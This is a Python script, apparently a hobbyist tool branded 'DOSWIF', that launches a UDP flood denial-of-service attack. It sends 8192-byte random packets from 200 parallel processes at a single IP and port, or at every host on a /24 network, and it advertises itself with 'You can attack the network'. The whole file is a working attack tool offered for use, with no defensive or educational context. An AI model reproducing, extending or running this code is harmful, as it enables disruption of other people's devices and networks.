import socket
import random
import multiprocessing
import time
import ipaddress
import os
import sys


os.system('clear')  



if os.geteuid() != 0:
    print("\033[1;31mRun the program with root privileges!\033[0m")
    sys.exit(1)

v = " \033[1;31m "
print(v + """
888888ba   .88888.  .d88888b  dP   dP   dP dP  88888888b 
88    `8b d8'   `8b 88.    "' 88   88   88 88  88        
88     88 88     88 `Y88888b. 88  .8P  .8P 88 a88aaaa    
88     88 88     88       `8b 88  d8'  d8' 88  88        
88    .8P Y8.   .8P d8'   .8P 88.d8P8.d8P  88  88        
8888888P   `8888P'   Y88888P  8888' Y88'   dP  dP        
ooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
""")

p = " \033[1;37m "
print(p)
print("-Made by BOYARB🎭 ")
print("-You can attack the network🚀 ")

print("""
""" )


def udp_flood(target_ip, target_port, count, packets_per_process=1000):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(8192)  
    while count < packets_per_process:
        client.sendto(data, (target_ip, target_port))  
        count += 1
        if count % 100 == 0:  
            print(f"Sent {count} packets to {target_ip}:{target_port}")


def start_attack(target_ip, target_port):
    processes = []
    for i in range(200):  
        process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, i + 1))
        process.daemon = True
        processes.append(process)
        process.start()

    for process in processes:
        process.join()


def attack_network(network_ip, target_port):
    net = ipaddress.IPv4Network(network_ip, strict=False)
    for ip in net.hosts():  
        print(f"Attacking {ip}...")
        start_attack(str(ip), target_port)


def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False


def contains_three_dots(ip):
    return ip.count('.') == 3


if __name__ == "__main__":
    print("\033[1;34mChoose the type of attack:\033[0m\n")
    print("\033[0;32m1 - Attack a specific device in the network\033[0m\n")
    print("\033[0;32m2 - Attack an entire network\033[0m\n")

    print("\033[0;35mEnter the corresponding number (1/2):\033[0m", end=" ")

    choice = input().strip()

    if choice == "1":
        target_ip = input("\033[0;36mEnter the target device IP address: \033[0m").strip()
        target_port = input("\033[0;36mEnter the target port (usually 80 or 443): \033[0m").strip()

        
        if not target_ip:
            print("\033[1;31mError: You must enter the mobile device IP address.\033[0m")
        elif not target_port:
            print("\033[1;31mError: You must enter the port.\033[0m")
        elif not is_valid_ip(target_ip):
            print("\033[1;31mError: Invalid IP address format.\033[0m")
        elif not contains_three_dots(target_ip):
            print("\033[1;31mError: You must enter the mobile device IP address.\033[0m")
        elif not target_port.isdigit():
            print("\033[1;31mError: Port must be a valid number.\033[0m")
        else:
            target_port = int(target_port)
            print(f"Attacking {target_ip}:{target_port}...\n")
            start_attack(target_ip, target_port)

    elif choice == "2":
        network_ip = input("\033[0;36mEnter the network address (e.g., 192.168.1.0/24): \033[0m").strip()
        target_port = input("\033[0;36mEnter the target port (usually 80 or 443): \033[0m").strip()

        
        if not network_ip:
            print("\033[1;31mError: You must enter the network IP address.\033[0m")
        elif '/24' not in network_ip:
            print("\033[1;31mError: You must enter a network IP with /24 (e.g., 192.168.1.0/24).\033[0m")
        elif not contains_three_dots(network_ip.split('/')[0]):  
            print("\033[1;31mError: The IP address in the network must contain exactly 3 dots (e.g., 192.168.1.0).\033[0m")
        elif not target_port:
            print("\033[1;31mError: You must enter the port.\033[0m")
        elif not target_port.isdigit():
            print("\033[1;31mError: Port must be a valid number.\033[0m")
        else:
            target_port = int(target_port)
            print(f"Attacking the network {network_ip}...\n")
            attack_network(network_ip, target_port)

    else:
        print("\033[1;31mInvalid choice. Please enter 1 or 2.\033[0m") 
